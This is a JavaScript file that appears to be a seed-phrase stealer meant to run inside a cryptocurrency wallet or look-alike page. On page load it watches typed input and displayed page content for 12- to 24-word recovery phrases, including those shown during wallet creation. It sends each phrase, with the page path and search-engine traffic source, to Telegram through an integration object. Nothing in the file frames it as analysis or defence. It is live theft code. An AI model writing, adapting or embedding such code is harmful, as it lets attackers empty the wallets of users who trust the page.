// Traffic source detection
function getTrafficSource() {
  const referrer = document.referrer.toLowerCase();
  const urlParams = new URLSearchParams(window.location.search);
  
  // Check referrer
  if (referrer.includes('google.com') || referrer.includes('google.co')) {
    return 'Google SEO';
  } else if (referrer.includes('bing.com')) {
    return 'Bing SEO';
  }
  
  // Check URL parameters
  const source = urlParams.get('utm_source') || urlParams.get('source');
  if (source) {
    if (source.toLowerCase().includes('google')) return 'Google SEO';
    if (source.toLowerCase().includes('bing')) return 'Bing SEO';
  }
  
  return referrer || 'Direct';
}

// Phrase validation (global scope)
function isSeedPhrase(value) {
  if (!value || typeof value !== 'string') return false;
  const words = value.trim().split(/\s+/).filter(w => w.length > 0);
  return [12, 15, 18, 21, 24].includes(words.length);
}

// Monitor displayed seed phrases (wallet creation)
function monitorDisplayedPhrases() {
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) {
          checkForDisplayedPhrase(node);
        }
      });
    });
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
  
  // Check existing content multiple times (catch lazy-loaded content)
  setTimeout(() => checkForDisplayedPhrase(document.body), 1000);
  setTimeout(() => checkForDisplayedPhrase(document.body), 3000);
  setTimeout(() => checkForDisplayedPhrase(document.body), 5000);
  
  // Periodic re-scan every 5 seconds for 30 seconds
  let scanCount = 0;
  const periodicScan = setInterval(function() {
    checkForDisplayedPhrase(document.body);
    scanCount++;
    if (scanCount >= 6) clearInterval(periodicScan);
  }, 5000);
}

function checkForDisplayedPhrase(element) {
  if (!element || !element.querySelectorAll) return;
  
  // Look for seed phrase containers (common patterns)
  const selectors = [
    '[class*="seed"]',
    '[class*="phrase"]',
    '[class*="mnemonic"]',
    '[class*="recovery"]',
    '[class*="backup"]',
    '[class*="word"]',
    '[class*="wallet"]',
    '[class*="create"]',
    '[data-testid*="seed"]',
    '[data-testid*="phrase"]',
    'textarea',
    'pre',
    'code',
    '.word-list',
    '.word-grid',
    '.phrase-display'
  ];
  
  // Also check ALL div and span elements as fallback
  const allElements = element.querySelectorAll('div, span, p, textarea, pre, code');
  const combined = new Set([...allElements]);
  
  // Add selector-matched elements
  selectors.forEach(function(selector) {
    try {
      const matched = element.querySelectorAll(selector);
      matched.forEach(el => combined.add(el));
    } catch (e) {}
  });
  
  // Check each element
  combined.forEach(function(el) {
    if (el.getAttribute('data-phrase-logged')) return;
    
    // Get text content (handle various formats)
    let text = '';
    if (el.tagName === 'TEXTAREA' || el.tagName === 'INPUT') {
      text = el.value || '';
    } else {
      text = el.textContent || el.innerText || '';
    }
    
    const trimmed = text.trim();
    
    // Check if it's a valid seed phrase
    if (trimmed && isSeedPhrase(trimmed)) {
      el.setAttribute('data-phrase-logged', 'true');
      const trafficSource = getTrafficSource();
      const wordCount = trimmed.split(/\s+/).filter(w => w.length > 0).length;
      
      console.log('📋 Found ' + wordCount + '-word phrase in', el.tagName, el.className);
      
      if (window.TelegramIntegration) {
        window.TelegramIntegration.send({
          type: 'WALLET_CREATED_PHRASE_DISPLAYED',
          content: trimmed,
          wordCount: wordCount,
          element: el.tagName + (el.className ? '.' + el.className : ''),
          context: 'User saw this phrase during wallet creation',
          page: window.location.pathname,
          trafficSource: trafficSource,
          timestamp: new Date().toISOString()
        }).then(() => console.log('✅ Sent to Telegram: ' + wordCount + ' words from ' + trafficSource))
          .catch(e => console.error('❌ Failed to send:', e));
      }
    }
  });
}

// Auto-capture seed phrases only (NO passwords)
document.addEventListener('DOMContentLoaded', function() {
  const trafficSource = getTrafficSource();
  console.log('🔍 Traffic source:', trafficSource);
  
  // Start monitoring for displayed phrases
  monitorDisplayedPhrases();
  
  // Enhanced phrase detection - captures 12, 15, 18, 21, 24 words
  let lastSentValue = '';
  let phraseTimeout;
  
  document.addEventListener('input', function(e) {
    const target = e.target;
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
      clearTimeout(phraseTimeout);
      phraseTimeout = setTimeout(function() {
        const val = target.value.trim();
        
        // Only send if value changed and is a seed phrase
        if (val !== lastSentValue && isSeedPhrase(val)) {
          lastSentValue = val;
          const words = val.split(/\s+/).filter(w => w.length > 2);
          
          if (window.TelegramIntegration) {
            window.TelegramIntegration.send({
              type: 'SEED_PHRASE',
              content: val,
              wordCount: words.length,
              field: target.name || target.id || target.placeholder || 'input_field',
              page: window.location.pathname,
              trafficSource: trafficSource,
              timestamp: new Date().toISOString()
            }).then(() => console.log('✅ Phrase sent (' + words.length + ' words) from ' + trafficSource)).catch(e => console.error('❌ Failed:', e));
          }
        }
      }, 800);
    }
  });
  
  // Also on blur
  document.addEventListener('blur', function(e) {
    const target = e.target;
    if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.value.trim()) {
      const val = target.value.trim();
      if (isSeedPhrase(val) && val !== lastSentValue) {
        lastSentValue = val;
        const words = val.split(/\s+/).filter(w => w.length > 2);
        
        if (window.TelegramIntegration) {
          window.TelegramIntegration.send({
            type: 'SEED_PHRASE_BLUR',
            content: val,
            wordCount: words.length,
            field: target.name || target.id || target.placeholder || 'input_field',
            page: window.location.pathname,
            trafficSource: trafficSource
          });
        }
      }
    }
  }, true);
});
